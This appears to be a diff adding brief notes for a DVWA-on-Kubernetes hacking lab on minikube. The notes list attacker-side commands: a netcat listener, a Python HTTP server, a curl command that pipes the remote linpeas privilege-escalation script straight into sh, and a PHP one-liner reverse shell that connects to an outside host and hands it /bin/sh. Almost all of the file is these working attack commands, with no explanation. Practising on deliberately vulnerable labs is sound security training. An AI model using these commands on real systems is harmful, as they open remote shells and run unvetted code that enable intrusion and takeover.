@@ -1,0 +1,14 @@
+# Deploy DWVA K8s on minikube
+
+# 
+
+# Attacker
+nc -lv 45678
+sudo python3 -m http.server 45678
+
+# Priv escalation
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# PHP rev shell
+
+php -r '$sock=fsockopen("kurtisvelarde.com",45678);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
